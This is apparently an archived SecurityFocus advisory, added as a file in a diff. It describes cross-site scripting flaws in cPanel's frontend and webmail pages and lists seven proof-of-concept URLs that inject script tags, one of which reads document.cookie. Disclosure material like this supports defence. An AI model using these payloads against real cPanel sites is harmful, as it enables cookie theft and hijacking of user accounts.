@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/16482/info
+
+cPanel is prone to multiple cross-site scripting vulnerabilities. These issues are due to a lack of proper sanitization of user-supplied input.
+
+An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.
+
+
+Successful exploitation may allow an attacker to gain unauthorized access to a cPanel user's account. 
+
+http://www.example.com:2082/frontend/xcontroller/editquota.html?email=<script>alert('vul')</script>&domain=
+
+http://www.example.com:2082/frontend/xcontroller/dodelpop.html?email=<script>alert('vul')</script>&domain=xxx
+
+http://www.example.com:2082/frontend/xcontroller/diskusage.html?showtree=0"><script>alert('vul')</script>
+
+http://www.example.com:2082/frontend/xcontroller/stats/detailbw.html?mon=Jan&year=2006&domain=xxx&target="><script>alert('vul')</script>
+
+http://www.example.com:2082/frontend/xcontroller/stats/detailbw.html?mon=Jan&year=2006&domain=xxx"><script>alert('vul')</script>&target=xxx
+
+http://www.example.com:2082/frontend/xcontroller/stats/detailbw.html?mon=Jan&year=2006"><script>alert('vul')</script>&domain=xxx&target=xxx
+
+http://www.example.com:2095/webmailaging.cgi?numdays=%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E&ageaction=change 
